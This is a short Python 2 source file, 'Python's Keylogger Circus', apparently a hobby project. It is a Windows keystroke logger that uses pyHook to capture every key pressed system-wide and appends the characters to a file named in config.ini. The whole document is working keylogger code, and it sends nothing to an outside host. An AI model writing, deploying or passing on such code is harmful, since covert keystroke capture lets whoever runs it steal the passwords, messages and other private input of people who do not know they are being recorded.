#		Python's Keylogger Circus
# 	A simple keystroke recorder
# 		- v.1.2

#		Windows-only Compatible
# 	Requires PyHook: pyhook.sourceforge.net

import pythoncom, pyHook

#	Reads configuration file
from ConfigParser import SafeConfigParser
parser = SafeConfigParser()
parser.read('config.ini')

# Sets variable from config.ini
dir = parser.get('Setup','directory')

def OnKeyboardEvent(event):
	f=open(dir,'a')
	keylog=chr(event.Ascii)
	if event.Ascii==13:
		keylog='/n'
	f.write(keylog)
	f.close()

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
